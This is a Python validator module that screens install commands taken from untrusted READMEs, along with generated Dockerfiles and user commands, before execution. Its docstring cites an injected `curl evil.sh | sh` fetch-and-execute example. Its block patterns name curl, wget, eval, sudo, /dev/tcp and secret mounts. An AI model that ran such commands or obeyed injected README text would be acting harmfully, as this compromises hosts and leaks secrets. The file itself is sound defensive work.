"""Command validator — the prompt-injection defense.

Install commands are derived from an UNTRUSTED README. A malicious repo can try to smuggle
`curl evil.sh | sh` into the command we execute. Docker limits the blast radius,
but the build step has network and runs arbitrary RUN lines — so every install
command passes this allowlist before it is ever executed.

Rules (docs/architecture.md):
  * allowed leading verb
  * no fetch-execute chaining (pipes, eval, command substitution)
  * no redirection or privilege escalation
  * must reference the repo being installed (local-only verbs exempt)
  * length + charset sanity
"""
from __future__ import annotations

import os
import re
from dataclasses import dataclass

# Leading verbs we permit. Longest-first matching, so "pip3 install" wins over
# "pip". This list WILL go stale — package managers keep appearing (uv broke it
# once already) — so treat it as a sanity check, not the security boundary. The
# shell-hygiene rules below are what actually stop fetch-and-execute.
# Extend at runtime with PENSTATION_EXTRA_INSTALL_VERBS="foo install,bar add".
ALLOWED_VERBS = (
    # python
    "pip3 install", "pip install", "pipx install",
    "uv sync", "uv pip install", "uv tool install", "uv add", "uv run",
    "poetry install", "poetry add", "pdm install", "pipenv install",
    "python -m pip install", "python3 -m pip install",
    # go
    "go install", "go get", "go build",
    # node
    "npm install", "npm i", "npm ci", "pnpm install", "pnpm add",
    "yarn install", "yarn add", "bun install", "bun add",
    # rust / ruby / php
    "cargo install", "cargo build", "gem install", "composer install",
    # containers + source
    "docker build", "docker pull", "git clone",
    # build + dependency steps that legitimately lead a recipe
    "make", "cmake", "apk add", "apt-get install", "apt-get update",
    "bash install.sh", "sh install.sh",
)


def _extra_verbs() -> tuple[str, ...]:
    raw = os.environ.get("PENSTATION_EXTRA_INSTALL_VERBS", "")
    return tuple(v.strip().lower() for v in raw.split(",") if v.strip())


# Verbs that operate on an already-local checkout, so they can't be expected to
# name the repo.
LOCAL_VERBS = ("make", "cmake", "uv sync", "uv run", "poetry install",
               "pdm install", "pipenv install", "npm install", "npm ci",
               "pnpm install", "yarn install", "bun install", "go build",
               "cargo build", "composer install", "apk add", "apt-get install",
               "apt-get update", "bash install.sh", "sh install.sh")

# Shell metacharacters that enable chaining/substitution/redirection.
FORBIDDEN_CHARS = {
    "|": "pipes",
    ";": "command chaining",
    "&": "backgrounding/chaining",
    ">": "output redirection",
    "<": "input redirection",
    "`": "command substitution",
    "\n": "newlines",
    "\r": "newlines",
}

FORBIDDEN_PATTERNS = (
    (re.compile(r"\$\("), "command substitution"),
    (re.compile(r"\$\{"), "variable expansion"),
    (re.compile(r"\beval\b", re.I), "eval"),
    (re.compile(r"\b(sudo|su|doas)\b", re.I), "privilege escalation"),
    (re.compile(r"\bcurl\b", re.I), "network fetch in an install command"),
    (re.compile(r"\bwget\b", re.I), "network fetch in an install command"),
    (re.compile(r"\bchmod\s+[0-7]*7[0-7]*\b"), "permission escalation"),
    (re.compile(r"/dev/tcp/"), "raw socket redirection"),
)

MAX_LEN = 400


@dataclass
class Result:
    ok: bool
    reason: str = ""

    def __bool__(self) -> bool:
        return self.ok


def _verb(cmd: str) -> str | None:
    low = cmd.lower()
    for verb in sorted(ALLOWED_VERBS + _extra_verbs(), key=len, reverse=True):
        if low.startswith(verb):
            return verb
    return None


def _is_local(cmd: str, verb: str) -> bool:
    """Does this command operate on an already-local checkout?

    Such commands can't be expected to name the repo. Besides the always-local
    verbs, any `-r requirements.txt` / `--requirement` form qualifies: GitGot's
    README says `pip3 install -r requirements.txt`, which got rejected as an
    "unrelated source" even though it is the repo's own documented install.
    """
    if verb in LOCAL_VERBS:
        return True
    # `-r requirements.txt` — installs from a file in the checkout.
    if re.search(r"(^|\s)(-r|--requirement)(\s|=)", cmd):
        return True
    # `pip install .` / `pip install -e .` — the target *is* the checkout, so
    # naming the repo is impossible. Rejecting these emptied the recipe list for
    # any script-shaped-but-packaged repo (cloud_enum), pushing a solvable
    # install list empty for no reason.
    return bool(re.search(r"(^|\s)(-e\s+)?\.(\s|$)", cmd))


def validate_install(cmd: str, owner: str = "", repo: str = "") -> Result:
    """Gate an install command before it is executed."""
    cmd = (cmd or "").strip()

    if not cmd:
        return Result(False, "empty install command")
    if len(cmd) > MAX_LEN:
        return Result(False, f"install command too long ({len(cmd)} > {MAX_LEN})")
    if any(ord(ch) < 32 for ch in cmd):
        return Result(False, "control characters in install command")

    verb = _verb(cmd)
    if verb is None:
        head = cmd.split()[0] if cmd.split() else cmd
        return Result(False, f"disallowed command; must start with one of "
                             f"{', '.join(ALLOWED_VERBS)} (got {head!r})")

    for ch, why in FORBIDDEN_CHARS.items():
        if ch in cmd:
            return Result(False, f"{why} not allowed in an install command")
    for pat, why in FORBIDDEN_PATTERNS:
        if pat.search(cmd):
            return Result(False, f"{why} not allowed in an install command")

    if not _is_local(cmd, verb) and (owner or repo):
        low = cmd.lower()
        if (repo and repo.lower() in low) or (owner and owner.lower() in low):
            pass
        else:
            return Result(False, f"install command does not reference {owner}/{repo} — "
                                 "refusing to install from an unrelated source")

    return Result(True)


# Base images a generated Dockerfile may start FROM. Pinning to
# official images stops a repaired Dockerfile from pulling an arbitrary one.
ALLOWED_BASES = ("golang", "python", "node", "rust", "alpine", "debian", "ubuntu",
                 "busybox", "gcr.io/distroless/")

# Fetch-execute and secret-exfiltration patterns inside RUN lines.
DOCKERFILE_BAD = (
    (re.compile(r"(curl|wget)[^\n|]*\|\s*(ba)?sh", re.I), "piping a download into a shell"),
    (re.compile(r"^\s*ADD\s+https?://", re.I | re.M), "ADD from a URL"),
    (re.compile(r"--mount=type=(secret|ssh)", re.I), "secret/ssh mount"),
    (re.compile(r"/dev/tcp/"), "raw socket redirection"),
    (re.compile(r"^\s*(COPY|ADD)\s+(?!--from=)", re.I | re.M), "COPY/ADD from a build "
     "context (there is none — clone inside a RUN instead)"),
)

MAX_DOCKERFILE_LINES = 60


def validate_dockerfile(text: str) -> Result:
    """Gate a generated Dockerfile before it is built."""
    df = (text or "").strip()
    if not df:
        return Result(False, "empty Dockerfile")
    lines = [l for l in df.splitlines() if l.strip() and not l.strip().startswith("#")]
    if not lines:
        return Result(False, "Dockerfile has no instructions")
    if len(lines) > MAX_DOCKERFILE_LINES:
        return Result(False, f"Dockerfile too long ({len(lines)} instructions)")

    first = lines[0].strip()
    if not first.upper().startswith("FROM "):
        return Result(False, f"Dockerfile must start with FROM (got {first[:40]!r})")

    for line in lines:
        if line.strip().upper().startswith("FROM "):
            image = line.split(None, 1)[1].strip().split(" AS ")[0].strip().lower()
            if not image.startswith(ALLOWED_BASES):
                return Result(False, f"base image {image!r} is not an allowed official image")

    for pat, why in DOCKERFILE_BAD:
        if pat.search(df):
            return Result(False, f"{why} not allowed in a Dockerfile")

    return Result(True)


def validate_command(command: str) -> Result:
    """Gate a free-form run command you typed.

    This is a usability guard more than a security one — the command runs as argv
    inside the tool's container with no shell, so shell syntax wouldn't do what
    you expect (a pipe would become a literal argument). Better to say so than to
    silently misbehave.
    """
    t = (command or "").strip()
    if not t:
        return Result(False, "empty command")
    if len(t) > MAX_LEN:
        return Result(False, f"command too long (>{MAX_LEN} chars)")
    if any(ord(ch) < 32 for ch in t):
        return Result(False, "control characters in command")
    for ch, why in FORBIDDEN_CHARS.items():
        if ch in t:
            return Result(False, f"{why} won't work here — the command runs "
                                 "directly in the container with no shell")
    for pat, why in FORBIDDEN_PATTERNS:
        if pat.search(t):
            return Result(False, f"{why} won't work here — no shell is involved")
    return Result(True)


MAX_INPUT_LINES = 100_000


def validate_input(text: str) -> Result:
    """Gate a pasted input list before it is written into the container.

    It becomes a file, not part of the command, so shell metacharacters are
    harmless here — but a NUL byte truncates the file for any C program reading
    it, which would silently shorten your target list.
    """
    if "\x00" in (text or ""):
        return Result(False, "the list contains a NUL byte")
    lines = [l for l in (text or "").splitlines() if l.strip()]
    if not lines:
        return Result(False, "the list is empty")
    if len(lines) > MAX_INPUT_LINES:
        return Result(False, f"too many lines ({len(lines)} > {MAX_INPUT_LINES})")
    return Result(True)


# The extracted hint is validated the same way (its {{target}} placeholder is
# harmless to these checks).
validate_run = validate_command
